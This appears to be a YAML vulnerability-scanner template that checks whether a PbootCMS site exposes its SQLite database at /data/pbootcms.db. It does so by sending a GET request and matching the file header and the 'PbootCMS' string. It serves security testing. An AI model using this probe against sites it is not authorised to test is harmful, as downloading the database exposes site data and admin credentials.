detail:
  author: abcRosexyz(https://github.com/abcRosexyz)
  links:
  - https://www.cnblogs.com/0daybug/p/12786036.html
expression: r0()
manual: true
name: poc-yaml-pbootcms-database-file-download
rules:
  r0:
    expression: response.status == 200 && "^SQLite format 3\\x00\\x10".bmatches(response.body)
      && response.body.bcontains(b"PbootCMS")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /data/pbootcms.db
transport: http
